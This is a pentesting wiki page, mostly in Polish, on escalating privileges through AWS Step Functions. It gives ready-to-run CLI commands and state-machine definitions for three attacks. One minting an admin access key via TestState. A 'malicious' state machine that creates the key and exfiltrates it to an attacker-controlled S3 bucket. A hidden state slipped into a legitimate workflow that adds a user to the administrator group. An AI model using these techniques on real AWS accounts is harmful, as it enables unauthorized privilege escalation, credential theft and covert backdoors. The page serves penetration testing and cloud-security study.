# AWS - Step Functions Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## Step Functions

For more information about this AWS service, check:

{{#ref}}
../../aws-services/aws-stepfunctions-enum.md
{{#endref}}

### Zasoby typu Task

Te techniki eskalacji uprawnień będą wymagać użycia niektórych zasobów AWS Step Functions, aby wykonać pożądane działania eskalacji uprawnień.

Aby sprawdzić wszystkie możliwe akcje, możesz wejść na swoje konto AWS, wybrać akcję, której chcesz użyć i zobaczyć parametry, których używa, jak na przykład:

<figure><img src="../../../images/telegram-cloud-photo-size-4-5920521132757336440-y.jpg" alt=""><figcaption></figcaption></figure>

Możesz też zajrzeć do dokumentacji API AWS i sprawdzić dokumentację każdej akcji:

- [**AddUserToGroup**](https://docs.aws.amazon.com/IAM/latest/APIReference/API_AddUserToGroup.html)
- [**GetSecretValue**](https://docs.aws.amazon.com/secretsmanager/latest/apireference/API_GetSecretValue.html)

### `states:TestState` & `iam:PassRole`

Atakujący posiadający uprawnienia **`states:TestState`** i **`iam:PassRole`** może testować dowolny stan i przekazać do niego dowolną rolę IAM bez tworzenia ani aktualizacji istniejącej maszyny stanów, co potencjalnie umożliwia nieautoryzowany dostęp do innych usług AWS z uprawnieniami tych ról. W połączeniu te uprawnienia mogą prowadzić do rozległych nieautoryzowanych działań — od manipulowania przepływami pracy i modyfikowania danych, przez wycieki danych i manipulację zasobami, aż po eskalację uprawnień.
```bash
aws states test-state --definition <value> --role-arn <value> [--input <value>] [--inspection-level <value>] [--reveal-secrets | --no-reveal-secrets]
```
Poniższe przykłady pokazują, jak przetestować stan, który tworzy klucz dostępu dla użytkownika **`admin`**, wykorzystując te uprawnienia oraz rolę o szerokich uprawnieniach w środowisku AWS. Taka rola powinna mieć przypisaną dowolną politykę o wysokich uprawnieniach (na przykład **`arn:aws:iam::aws:policy/AdministratorAccess`**), która pozwala stanowi wykonać akcję **`iam:CreateAccessKey`**:

- **stateDefinition.json**:
```json
{
"Type": "Task",
"Parameters": {
"UserName": "admin"
},
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"End": true
}
```
- **Polecenie** wykonane w celu przeprowadzenia privesc:
```bash
aws stepfunctions test-state --definition file://stateDefinition.json --role-arn arn:aws:iam::<account-id>:role/PermissiveRole

{
"output": "{
\"AccessKey\":{
\"AccessKeyId\":\"AKIA1A2B3C4D5E6F7G8H\",
\"CreateDate\":\"2024-07-09T16:59:11Z\",
\"SecretAccessKey\":\"1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j1a2b3c4d5e6f7g8h9i0j\",
\"Status\":\"Active\",
\"UserName\":\"admin\"
}
}",
"status": "SUCCEEDED"
}
```
**Potencjalny wpływ**: Nieautoryzowane uruchamianie i manipulacja workflowami oraz dostęp do wrażliwych zasobów, co może prowadzić do poważnych naruszeń bezpieczeństwa.

### `states:CreateStateMachine` & `iam:PassRole` & (`states:StartExecution` | `states:StartSyncExecution`)

Atakujący posiadający **`states:CreateStateMachine`** i **`iam:PassRole`** będzie mógł utworzyć state machine i przypisać do niej dowolną rolę IAM, co umożliwi nieautoryzowany dostęp do innych usług AWS z uprawnieniami tej roli. W przeciwieństwie do poprzedniej privesc technique (**`states:TestState`** & **`iam:PassRole`**), ta nie wykonuje się sama — potrzebne są także uprawnienia **`states:StartExecution`** lub **`states:StartSyncExecution`** (**`states:StartSyncExecution`** **nie jest dostępne dla standard workflows**, **tylko dla express state machines**) aby rozpocząć wykonanie state machine.
```bash
# Create a state machine
aws states create-state-machine --name <value> --definition <value> --role-arn <value> [--type <STANDARD | EXPRESS>] [--logging-configuration <value>]\
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]

# Start a state machine execution
aws states start-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]

# Start a Synchronous Express state machine execution
aws states start-sync-execution --state-machine-arn <value> [--name <value>] [--input <value>] [--trace-header <value>]
```
Poniższe przykłady pokazują, jak utworzyć state machine, która tworzy klucz dostępu dla użytkownika **`admin`** i eksfiltruje ten klucz do kontrolowanego przez atakującego S3 bucket, wykorzystując te uprawnienia oraz rolę o szerokich uprawnieniach w środowisku AWS. Rola ta powinna mieć przypisaną politykę z wysokimi uprawnieniami (na przykład **`arn:aws:iam::aws:policy/AdministratorAccess`**), która pozwala state machine wykonać akcje **`iam:CreateAccessKey`** oraz **`s3:putObject`**.

- **stateMachineDefinition.json**:
```json
{
"Comment": "Malicious state machine to create IAM access key and upload to S3",
"StartAt": "CreateAccessKey",
"States": {
"CreateAccessKey": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:iam:createAccessKey",
"Parameters": {
"UserName": "admin"
},
"ResultPath": "$.AccessKeyResult",
"Next": "PrepareS3PutObject"
},
"PrepareS3PutObject": {
"Type": "Pass",
"Parameters": {
"Body.$": "$.AccessKeyResult.AccessKey",
"Bucket": "attacker-controlled-S3-bucket",
"Key": "AccessKey.json"
},
"ResultPath": "$.S3PutObjectParams",
"Next": "PutObject"
},
"PutObject": {
"Type": "Task",
"Resource": "arn:aws:states:::aws-sdk:s3:putObject",
"Parameters": {
"Body.$": "$.S3PutObjectParams.Body",
"Bucket.$": "$.S3PutObjectParams.Bucket",
"Key.$": "$.S3PutObjectParams.Key"
},
"End": true
}
}
}
```
- **Polecenie** wykonane w celu **utworzenia maszyny stanów**:
```bash
aws stepfunctions create-state-machine --name MaliciousStateMachine --definition file://stateMachineDefinition.json --role-arn arn:aws:iam::123456789012:role/PermissiveRole
{
"stateMachineArn": "arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine",
"creationDate": "2024-07-09T20:29:35.381000+02:00"
}
```
- **Polecenie** wykonane w celu **rozpoczęcia wykonania** wcześniej utworzonej maszyny stanów:
```json
aws stepfunctions start-execution --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:MaliciousStateMachine
{
"executionArn": "arn:aws:states:us-east-1:123456789012:execution:MaliciousStateMachine:1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f",
"startDate": "2024-07-09T20:33:35.466000+02:00"
}
```
> [!WARNING]
> Bucket S3 kontrolowany przez atakującego powinien mieć uprawnienia do przyjmowania akcji s3:PutObject z konta ofiary.

**Potencjalny wpływ**: Nieautoryzowane wykonywanie i manipulacja przepływami pracy oraz dostęp do wrażliwych zasobów, co może prowadzić do poważnych naruszeń bezpieczeństwa.

### `states:UpdateStateMachine` & (nie zawsze wymagane) `iam:PassRole`

Atakujący z uprawnieniem **`states:UpdateStateMachine`** będzie w stanie zmodyfikować definicję maszyny stanów, dodając ukryte stany, które mogą zakończyć się eskalacją uprawnień. W ten sposób, gdy prawidłowy użytkownik uruchomi wykonanie maszyny stanów, nowy złośliwy ukryty stan zostanie wykonany i eskalacja uprawnień powiedzie się.

W zależności od tego, jak obszerne są uprawnienia IAM Role skojarzonej z maszyną stanów, atakujący napotka dwa przypadki:

1. **Permissive IAM Role**: Jeśli IAM Role skojarzona z maszyną stanów ma już szerokie uprawnienia (np. ma dołączoną politykę **`arn:aws:iam::aws:policy/AdministratorAccess`**), to uprawnienie **`iam:PassRole`** nie będzie wymagane do eskalacji uprawnień, ponieważ nie będzie konieczne aktualizowanie IAM Role — sama definicja maszyny stanów wystarczy.
2. **Not permissive IAM Role**: W przeciwieństwie do poprzedniego przypadku, tutaj atakujący będzie również potrzebował uprawnienia **`iam:PassRole`**, ponieważ konieczne byłoby powiązanie maszyny stanów z permissive IAM Role oprócz modyfikacji definicji maszyny stanów.
```bash
aws states update-state-machine --state-machine-arn <value> [--definition <value>] [--role-arn <value>] [--logging-configuration <value>] \
[--tracing-configuration <enabled=true|false>] [--publish | --no-publish] [--version-description <value>]
```
Następujące przykłady pokazują, jak zmodyfikować prawidłową maszynę stanów, która jedynie wywołuje funkcję HelloWorld Lambda, aby dodać dodatkowy stan, który dodaje użytkownika `unprivilegedUser` do grupy IAM `administrator`. W ten sposób, kiedy uprawniony użytkownik uruchomi wykonanie zaktualizowanej maszyny stanów, nowy złośliwy ukryty stan zostanie wykonany, a eskalacja uprawnień zakończy się powodzeniem.

> [!WARNING]
> Jeżeli maszyna stanów nie ma powiązanej IAM Role o szerokich uprawnieniach, wymagane będzie również uprawnienie `iam:PassRole` do zaktualizowania IAM Role w celu przypisania IAM Role o szerokich uprawnieniach (na przykład takiej z dołączoną polityką `arn:aws:iam::aws:policy/AdministratorAccess`).

{{#tabs }}
{{#tab name="Legit State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}

{{#tab name="Malicious Updated State Machine" }}
```json
{
"Comment": "Hello world from Lambda state machine",
"StartAt": "Start PassState",
"States": {
"Start PassState": {
"Type": "Pass",
"Next": "LambdaInvoke"
},
"LambdaInvoke": {
"Type": "Task",
"Resource": "arn:aws:states:::lambda:invoke",
"Parameters": {
"FunctionName": "arn:aws:lambda:us-east-1:123456789012:function:HelloWorldLambda:$LATEST"
},
"Next": "AddUserToGroup"
},
"AddUserToGroup": {
"Type": "Task",
"Parameters": {
"GroupName": "administrator",
"UserName": "unprivilegedUser"
},
"Resource": "arn:aws:states:::aws-sdk:iam:addUserToGroup",
"Next": "End PassState"
},
"End PassState": {
"Type": "Pass",
"End": true
}
}
}
```
{{#endtab }}
{{#endtabs }}

- **Polecenie** wykonane w celu **zaktualizowania** **legalnej maszyny stanów**:
```bash
aws stepfunctions update-state-machine --state-machine-arn arn:aws:states:us-east-1:123456789012:stateMachine:HelloWorldLambda --definition file://StateMachineUpdate.json
{
"updateDate": "2024-07-10T20:07:10.294000+02:00",
"revisionId": "1a2b3c4d-1a2b-1a2b-1a2b-1a2b3c4d5e6f"
}
```
**Potencjalny wpływ**: Nieautoryzowane wykonywanie i manipulacja przepływami pracy oraz dostęp do zasobów wrażliwych, co może prowadzić do poważnych naruszeń bezpieczeństwa.

{{#include ../../../../banners/hacktricks-training.md}}
